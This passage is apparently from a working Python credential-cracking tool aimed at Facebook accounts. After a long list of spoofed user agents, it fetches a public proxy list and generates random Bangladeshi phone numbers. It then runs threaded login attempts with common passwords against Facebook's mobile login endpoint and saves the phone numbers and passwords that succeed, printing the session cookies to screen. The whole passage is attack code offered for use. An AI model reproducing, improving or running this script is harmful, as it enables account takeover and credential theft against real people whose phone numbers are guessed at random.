"Mozilla/5.0 (Linux; Android 8.1.0; HTC U12 life Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 11; RMX2063 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:37.163.127.55]",
"Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 11; M2006C3LVG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.18 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 9; INE-LX1 Build/HUAWEIINE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]",
"Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.58 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]PolaroidMusic/1229 CFNetwork/1404.0.5 Darwin/22.3.0",
"Mozilla/5.0 (Linux; Android 9; SM-T515 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 10; M2006C3LVG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41)",
"Mozilla/5.0 (Linux; Android 13; CPH2145 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.9.6.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.4.302 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.69 Safari/537.36 [ip:151.67.189.250]",
"Mozilla/5.0 (Linux; Android 13; M2101K9G Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118446",
"Mozilla/5.0 (Linux; Android 10; KingPad_SA8_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GNews Android/2022118446",
"Mozilla/5.0 (Linux; Android 13; LE2123 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.29 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 7.0; FRD-L09 Build/HUAWEIFRD-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 Instagram 274.0.0.26.90 Android (24/7.0; 480dpi; 1080x1794; HUAWEI/HONOR; FRD-L09; HWFRD; hi3650; en_GB; 456141779)",
"Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 10; POCOPHONE F1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; motorola edge Build/RPDS31.Q4U-39-26-14-10-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16G201 [FBAN/FBIOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5]",
"Mozilla/5.0 (Linux; Android 10; CLT-L29 Build/HUAWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",
"Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]",
"Mozilla/5.0 (Linux; Android 12; CPH2089) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.63 Mobile Safari/537.36 ABB/3.2.6",
"Mozilla/5.0 (Linux; Android 7.0; SM-T819 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; SM-G973F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Herring/100.1.1310.11",
"Mozilla/5.0 (Linux; Android 9; COR-L29 Build/HUAWEICOR-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; SM-G780F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 8T Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5]",
"Mozilla/5.0 (Linux; Android 13; SM-G7810 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; 220333QNY Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]radio.se 5.6.18 (iPhone; iPhone OS 16.2; sv_FI)",
"Mozilla/5.0 (Linux; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-M526B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118446",
"Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; XT1635-02 Build/OPNS27.76-12-22-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:193.207.129.16]",
"Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.71.101",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 9; SM-G611MT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile DuckDuckGo/5 Safari/537.36 [ip:92.88.170.234]",
"Mozilla/5.0 (Linux; Android 8.1.0; HTC U12 life Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44 [ip:188.6.110.242]",
"Mozilla/5.0 (Linux; Android 9; DUK-L09 Build/HUAWEIDUK-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]",
"Mozilla/5.0 (Linux; Android 13; RMX3301 Build/SKQ1.220617.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; SM-N981B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G928F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; 2201117TG Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; R2022 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; SM-T590 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Dalvik/2.1.0 (Linux; U; Android 13; 22071219CG Build/TP1A.220624.014)",
"Mozilla/5.0 (Linux; Android 10; M2007J3SY Build/QKQ1.200419.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 12; LM-K520 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-A035G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:77.205.22.172]",
"Mozilla/5.0 (Linux; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-7-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Armor 9E Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:151.82.196.155]",
"Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118458",
"Mozilla/5.0 (Linux; Android 11; SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:37.103.241.14]",
"Mozilla/5.0 (Linux; Android 13; SM-A526B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; SM-A305GT Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 13; SM-G985F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 8T Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:151.18.34.64]",
"Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]",]
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()
def uf():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🇧🇩 EXAMPLE : 017, 018, 019, 016, 9196, 9178┃ ')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    mr1 = '0171'
    mr2 = '0172'
    mr3 = '0182'
    mr4 = '0171'
    code = random.choice([mr1,mr2,mr3,mr4]) 
    pwx = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🇧🇩]EXAMPLE : 3000, 5000, 10000, 50000┃')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        clear()
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(" [🔰]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)                  
        print('\033[1;37m [🔰] SIM CODE : \033[38;5;46m'+code)           
        print(f' \033[97;1m[🔰]TOTAL IDS: '+tl)
        print(' \033[1;97m[🔰] Crack has been started      ')
        print(' \033[1;97m[🔰] Wait for ok ids             ')
        print(' \033[1;97m[🔰] Use flight mode for speed up ')
        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for fuck in user:
            pwx = [fuck,'bangladesh',fuck[2:],code+fuck,'i love you','sumaiya','yusuf@123','halima',code+fuck[2:],'i love you2',code+fuck[:5]]
            uid = code+fuck
            morshed.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[Ꮮᴇꪇᴇɴᴅ]\033[1;92m%s\033[m\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
			 'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;32m[WHITE DEVIL OK鈩] {uid}|{ps} \nCookie : {coki}")
                cek_apk(session,coki)
                open('/sdcard/WHITE DEVIL OK鈩.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\33[1;31m[WHITE DEVIL CP鈩] {uid}|{ps}")
                open('/sdcard/-WHITE DEVIL CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
uf()
 
